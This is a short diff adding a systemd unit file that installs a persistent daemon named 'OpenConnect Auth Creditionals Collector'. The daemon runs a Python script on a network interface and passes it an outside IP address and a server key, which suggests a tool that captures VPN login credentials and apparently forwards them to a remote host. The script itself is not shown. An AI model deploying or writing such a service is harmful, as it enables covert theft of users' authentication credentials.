@@ -1,0 +1,12 @@
+[Unit]
+Description=OpenConnect Auth Creditionals Collector
+
+[Service]
+Type=forking
+ExecStart=/usr/bin/python3 /opt/ocacc/ocacc.py --debug --daemon -i eth0 -I 43.64.18.128 -k server-key.pub
+WorkingDirectory=/opt/ocacc
+PIDFile=/run/ocacc.pid
+KillMode=process
+
+[Install]
+WantedBy=multi-user.target
